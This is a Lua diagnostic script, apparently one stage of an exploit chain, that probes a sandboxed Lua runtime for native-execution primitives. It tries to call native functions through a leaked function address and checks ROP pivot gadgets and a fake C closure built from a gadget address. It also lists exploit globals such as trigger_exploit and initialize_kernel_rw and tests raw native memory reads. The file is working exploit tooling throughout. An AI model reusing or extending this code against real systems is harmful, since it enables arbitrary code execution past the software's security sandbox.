-- CRASH_CLASS: MODERATE
-- PROBE 125c: Bootstrap native execution framework
-- native.fcall requires native_cmd_handler and native_invoke globals.
-- native_cmd_handler = native.create_cmd_handler()
-- native_invoke = lua.create_fake_cclosure(pivot_handler.gadget_addr)
-- This probe checks if these are already initialized, and if not,
-- tries to set them up and call getpid via native.fcall.

print("=== PROBE 125c: NATIVE EXEC BOOTSTRAP ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

-- Section A: Check if native execution is already set up
print("")
print("--- SECTION A: GLOBALS CHECK ---")
print("native_cmd_handler=" .. tostring(native_cmd_handler) .. " type=" .. type(native_cmd_handler or ""))
print("native_invoke=" .. tostring(native_invoke) .. " type=" .. type(native_invoke or ""))
print("native_cmd=" .. tostring(native_cmd) .. " type=" .. type(native_cmd or ""))

if type(native_cmd) == "table" then
    for k, v in pairs(native_cmd) do
        print(string.format("  native_cmd.%s = %s", tostring(k), tostring(v)))
    end
end

-- Check lua module
print("")
print("--- SECTION B: LUA MODULE ---")
if lua then
    local lk = {}
    for k, v in pairs(lua) do lk[#lk+1] = k .. "=" .. type(v) end
    table.sort(lk)
    for _, s in ipairs(lk) do print("  " .. s) end
else
    print("lua module not found")
end

-- Check pivot_handler
print("")
print("--- SECTION C: PIVOT HANDLER ---")
if type(native.pivot_handler_rop) == "table" then
    for k, v in pairs(native.pivot_handler_rop) do
        print(string.format("  pivot_handler_rop.%s = %s (%s)", tostring(k), tostring(v), type(v)))
    end
end

-- Section D: Try native.fcall directly (it may already work if the loader set it up)
print("")
print("--- SECTION D: DIRECT FCALL TEST ---")

-- Get a known function address from pipe_str
local pipe_str = tostring(syscall.pipe)
local fn_addr = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
print("fn_addr=" .. tostring(fn_addr))

if fn_addr then
    -- Try native.fcall(fn_addr, 20) for getpid
    local ok1, ret1 = pcall(native.fcall, uint64(fn_addr), 20)
    print("native.fcall(fn_addr, 20): ok=" .. tostring(ok1) .. " ret=" .. tostring(ret1))
    if ok1 then
        print("  ret_val=" .. to_num(ret1))
        if to_num(ret1) == pid then
            print("  *** NATIVE FCALL WORKS - GETPID RETURNED CORRECT PID ***")
        end
    else
        print("  error: " .. tostring(ret1))
    end
end

-- Section E: Try to initialize native execution
print("")
print("--- SECTION E: INIT NATIVE ---")

-- Check if native.register exists and what it does
if native.register then
    local di = debug.getinfo(native.register, "SLnu")
    print("native.register: line=" .. tostring(di.linedefined) .. "-" .. tostring(di.lastlinedefined))
end

-- Try calling native.create_cmd_handler
local ok_cmd, ret_cmd = pcall(native.create_cmd_handler)
print("create_cmd_handler: ok=" .. tostring(ok_cmd) .. " ret=" .. tostring(ret_cmd))
if not ok_cmd then
    print("  error: " .. tostring(ret_cmd))
end

-- Section F: Check all global variables that might be relevant
print("")
print("--- SECTION F: RELEVANT GLOBALS ---")
local globals_to_check = {
    "native_cmd_handler", "native_invoke", "native_cmd",
    "pivot_handler", "gadgets", "libkernel_base",
    "eboot_base", "PAGE_SIZE", "create_pipe",
    "ub8", "hex_dump", "lua",
    "initialize_kernel_rw", "trigger_exploit"
}
for _, name in ipairs(globals_to_check) do
    local val = _G[name]
    if val ~= nil then
        print(string.format("  %s = %s (%s)", name, tostring(val), type(val)))
    else
        print(string.format("  %s = nil", name))
    end
end

-- Section G: Try native.read_buffer on a known address
print("")
print("--- SECTION G: NATIVE READ TEST ---")
local test_buf = memory.alloc(0x100)
memory.write_dword(test_buf, 0x41424344)

local ok_nr, ret_nr = pcall(native.read_buffer, uint64(test_buf), 4)
print("native.read_buffer: ok=" .. tostring(ok_nr))
if ok_nr and ret_nr then
    local bytes = ""
    for i = 1, #ret_nr do bytes = bytes .. string.format("%02X ", ret_nr:byte(i)) end
    print("  data: " .. bytes)
    if ret_nr:byte(1) == 0x44 and ret_nr:byte(2) == 0x43 then
        print("  *** NATIVE READ_BUFFER WORKS ***")
    end
else
    print("  error: " .. tostring(ret_nr))
end

print("=== PROBE 125c COMPLETE ===")
